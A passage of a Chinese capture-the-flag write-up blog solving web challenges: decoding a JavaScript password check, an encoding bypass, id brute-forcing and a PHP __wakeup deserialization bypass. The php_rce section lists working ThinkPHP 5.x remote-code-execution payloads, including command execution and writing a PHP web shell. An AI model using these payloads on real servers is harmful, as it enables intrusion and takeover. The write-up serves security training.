class=\"token punctuation\">;</span>           <span class=\"token comment\">// 对传入的密码插入</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">var</span> tab2 <span class=\"token operator\">=</span> pass<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">var</span> i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">,</span>l<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>m<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>o<span class=\"token punctuation\">,</span>p <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                        k <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>n<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                        n <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                        o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token operator\">&amp;&amp;</span> i <span class=\"token operator\">&lt;</span> k<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                                        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span>tab2<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 这里只返回了部分字符</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        pass <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span><span class=\"token keyword\">return</span> pass<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    String<span class=\"token punctuation\">[</span><span class=\"token string\">\"fromCharCode\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 需要对比的密码</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    h <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">prompt</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Enter password'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>pass_enc**.split (**) 方法用于把一个字符串分割成字符串数组</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># ascii 转字符串</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hex_string <span class=\"token operator\">=</span> <span class=\"token string\">r\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>hex_values <span class=\"token operator\">=</span> hex_string<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>hex_value<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> hex_value <span class=\"token keyword\">in</span> hex_values<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ascii_values <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">55</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">79</span><span class=\"token punctuation\">,</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span><span class=\"token number\">69</span><span class=\"token punctuation\">,</span><span class=\"token number\">114</span><span class=\"token punctuation\">,</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">107</span><span class=\"token punctuation\">,</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> value <span class=\"token keyword\">in</span> ascii_values<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#55,56,54,79,115,69,114,116,107,49,50</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#786OsErtk12</span></pre></td></tr></table></figure><blockquote 786OsErtk12=\"\">\n<p>flag</p>\n</blockquote>\n<h2 id=\"baby_web\"><a class=\"markdownIt-Anchor\" href=\"#baby_web\">#</a> baby_web:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824221304273.png\" alt=\"image-20230824221304273\"></p>\n<p><img data-src=\"/img/webpic/image-20230824221335028.png\" alt=\"image-20230824221335028\"></p>\n<p>进入题目页面。初始页面一般是 index.php</p>\n<p>试着传入 index.php 试一下</p>\n<p>但是又回到 1.php</p>\n<p>用 burp 传一下试一下</p>\n<p><img data-src=\"/img/webpic/image-20230824221652725.png\" alt=\"image-20230824221652725\"></p>\n<p>成功找到 flag</p>\n<h2 id=\"php2\"><a class=\"markdownIt-Anchor\" href=\"#php2\">#</a> PHP2:&gt;</h2>\n<blockquote>\n<p>前置知识：</p>\n<p>phps 即为 PHP Source。</p>\n<p>phps 文件就是 php 的源代码文件，通常用于提供给用户（访问者）查看 php 代码，因为用户无法直接通过 Web 浏览器看到 php 文件的内容，所以需要用 phps 文件代替。其实，只要不用 php 等已经在服务器中注册过的 MIME 类型为文件即可，但为了国际通用，所以才用了 phps 文件类型</p>\n</blockquote>\n<p>这题 php 查看不了源码，只能用 phps 查看。</p>\n<p><img data-src=\"/img/webpic/image-20230824222125570.png\" alt=\"image-20230824222125570\"></p>\n<p>有点乱，用 burp 看一眼。</p>\n<p><img data-src=\"/img/webpic/image-20230824222253677.png\" alt=\"image-20230824222253677\"></p>\n<p>大概意思就是，GET 请求，如果 admin 等于传入的 id 在退出，但是下面可以通过 url 解码去绕过</p>\n<blockquote>\n<p>1, 只改变 a 即 %61dmin</p>\n<p>2, 全都改变 %61%64%6d%69%6e</p>\n</blockquote>\n<p>但是，进入网页可要 url 解码一次，所以 % 要改变 %25</p>\n<blockquote>\n<p>即最终的 payload 的为：?id=%2561%2564%256d%2569%256e</p>\n<p>​\t\t\t\t   \t\t\tor   ?id=%2561dmin</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824223440837.png\" alt=\"image-20230824223440837\"></p>\n<h2 id=\"ics-06\"><a class=\"markdownIt-Anchor\" href=\"#ics-06\">#</a> ics-06:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824223657576.png\" alt=\"image-20230824223657576\"></p>\n<p><img data-src=\"/img/webpic/image-20230824223722948.png\" alt=\"image-20230824223722948\"></p>\n<p>只有报表中心可以点</p>\n<p><img data-src=\"/img/webpic/image-20230824223808888.png\" alt=\"image-20230824223808888\"></p>\n<p>发现有 GET 传 id 的方式</p>\n<p>用 burp 抓下包看一下。（没有别的发现，只能对 id 爆破</p>\n<p><img data-src=\"/img/webpic/image-20230824224221045.png\" alt=\"image-20230824224221045\"></p>\n<p>这里添加 payload。</p>\n<p><img data-src=\"/img/webpic/image-20230824224258586.png\" alt=\"image-20230824224258586\"></p>\n<p>这样设置 payload，攻击！！</p>\n<p><img data-src=\"/img/webpic/image-20230824224459083.png\" alt=\"image-20230824224459083\"></p>\n<p>id=2333 异常。说明入侵者痕迹在这。</p>\n<p>查看响应包。</p>\n<p><img data-src=\"/img/webpic/image-20230824224825879.png\" alt=\"image-20230824224825879\"></p>\n<p>发现 flag</p>\n<h2 id=\"php_rce\"><a class=\"markdownIt-Anchor\" href=\"#php_rce\">#</a> php_rce:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824225156637.png\" alt=\"image-20230824225156637\"></p>\n<p>知识了解一下吧：</p>\n<blockquote>\n<p>1.ThinkPHP 简介：<br>\nThinkPHP 是一个开源，快速、简单的轻量级国产 PHP 开发框架，诞生于 2006 年初，原名 FCS，2007 年元旦正式更名为 ThinkPHP。使用面向对象的开发结构和 MVC 模式，融合了 Struts 的思想和 TagLib（标签库）、RoR 的 ORM 映射和 ActiveRecord 模式。</p>\n<p>ThinkPHP 可以支持 windows/Unix/Linux 等服务器环境，正式版需要 PHP 5.0 以上版本，支持 MySql、PgSQL、Sqlite 多种数据库以及 PDO 扩展，是一款跨平台，跨版本以及简单易用的 PHP 框架。</p>\n</blockquote>\n<p>其中 ThinkPHP 2 以及 ThinkPHP 3 系列已经停止维护，ThinkPHP 5 系列现使用最多，而 ThinkPHP 3 系列也积累了较多的历史用户。各个系列之间在代码实现及功能方面有较大区别。</p>\n<p>这是 PHP V5，找下 PHP V5 的漏洞。</p>\n<ul>\n<li>5.0.x：</li>\n</ul>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/think\\config/get&amp;name<span class=\"token operator\">=</span>database<span class=\"token punctuation\">.</span>username <span class=\"token comment\">// 获取配置信息</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Lang/load&amp;file<span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/test<span class=\"token punctuation\">.</span>jpg <span class=\"token comment\">// 包含任意文件</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Config/load&amp;file<span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/t<span class=\"token punctuation\">.</span>php <span class=\"token comment\">// 包含任意.php 文件</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>id <span class=\"token comment\">// 执行命令</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>/Index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>phpinfo&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">-1</span> <span class=\"token comment\">// 执行 phpinfo ();</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>/Index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>file_put_contents&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>shell<span class=\"token punctuation\">.</span>php&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php @eval<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span>\t<span class=\"token comment\">// 写入 shell</span></pre></td></tr></table></figure><ul>\n<li>5.1.x：</li>\n</ul>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Request/input&amp;filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;data<span class=\"token operator\">=</span><span class=\"token class-name\">pwd</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span></span>s<span class=\"token operator\">=</span>index/\\think\\view\\driver\\Php/display&amp;content<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name\">php</span> phpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\template\\driver\\file/write&amp;cacheFile<span class=\"token operator\">=</span>shell<span class=\"token punctuation\">.</span>php&amp;content<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php @eval<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Container/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token class-name\">id</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span></span>s<span class=\"token operator\">=</span>index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>id</pre></td></tr></table></figure><p>执行 5.0 的漏洞</p>\n<p><img data-src=\"/img/webpic/image-20230824225834486.png\" alt=\"image-20230824225834486\"></p>\n<p>发现当前目录没有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824230021454.png\" alt=\"image-20230824230021454\"></p>\n<p>根目录有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824230224897.png\" alt=\"image-20230824230224897\"></p>\n<p>得到 flag</p>\n<h2 id=\"unserialize3\"><a class=\"markdownIt-Anchor\" href=\"#unserialize3\">#</a> unserialize3:&gt;</h2>\n<p>反序列化：</p>\n<blockquote>\n<h3 id=\"什么是序列化serialize\"><a class=\"markdownIt-Anchor\" href=\"#什么是序列化serialize\">#</a> 什么是序列化 (serialize)</h3>\n<p>将对象的状态信息转换为可以存储或传输的形式的过程，简单来说，就是将状态信息保存为字符串</p>\n<h3 id=\"什么是反序列化unserialize\"><a class=\"markdownIt-Anchor\" href=\"#什么是反序列化unserialize\">#</a> 什么是反序列化 (unserialize)</h3>\n<p>将字符串转换为状态信息</p>\n<p>二、什么是反序列化漏洞</p>\n<p>当程序在进行反序列化时，会自动调用一些函数，例如_wakeup ()   _destruct () 等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。</p>\n</blockquote>\n<p>由于反序列化时 unserialize () 函数会自动调用 wakeup (),destruct (), 函数，当有一些漏洞或者恶意代码在这些函数中，当我们控制序列化的字符串时会去触发他们，从而达到攻击。</p>\n<blockquote>\n<p>__construct () : 构造函数，当创建对象时自动调用。</p>\n<p>__destruct (): 析构函数，在对象的所有引用都被删除时或者对象被显式销毁时调用，当对象被销毁时自动调用。</p>\n<p>__wakeup (): 进行 unserialize 时会查看是否有该函数，有的话有限调用。会进行初始化对象。遇到 unserialize () 时自动触发</p>\n<p>__ toString (): 当一个类被当成字符串时会被调用。</p>\n<p>__sleep (): 当一个对象被序列化时调用，可与设定序列化时保存的属性。</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>code<span class=\"token operator\">=</span></pre></td></tr></table></figure><p>这个题，需要去完善下代码。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span>                      <span class=\"token comment\">// 定义一个名为 xctf 的类</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// 定义一个公有的类属性 $flag，值为 111</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>      <span class=\"token comment\">// 定义一个公有的类方法__wakeup ()，输出 bad requests 后退出当前脚本</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$peak</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">xctf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 使用 new 运算符来实例化该类（xctf）的对象为 peak</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$peak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 输出被序列化的对象（peak）</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>执行下</p>\n<p><img data-src=\"/img/webpic/image-20230824231257800.png\" alt=\"image-20230824231257800\"></p>\n<blockquote>\n<p s:4:flag;s:3:111;=\"\">O:4:“xctf”:1:</p>\n<p>O 代表 object（为 A 时代表 Array），4 代表 &quot;test&quot; 占 4 个字符长度，1 代表着对象具有一个变量：flag，s 代表 string，字符型（如果为 i，代表 int 型）</p>\n<p>里面的值是不可修改的，但是可以修改的属性 (变量) 数大于实际的个数时，就可以绕过 wakeup</p>\n</blockquote>\n<p>所以 payload 为</p>\n<blockquote s:4:flag;s:3:111;=\"\">\n<p>?code=O:4:“xctf”:2:</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824231621861.png\" alt=\"image-20230824231621861\"></p>\n<h2 id=\"web_php_include\"><a class=\"markdownIt-Anchor\" href=\"#web_php_include\">#</a> Web_php_include:&gt;</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 显示当前文件的源代码</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'hello'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 输出名为 'hello' 的 GET 参数的值</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 将名为 'page' 的 GET 参数的值赋给变量 $page</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 当 $page 中包含 \"php://\" 时执行循环</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 将 $page 中的所有 \"php://\" 替换为空字符串</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token 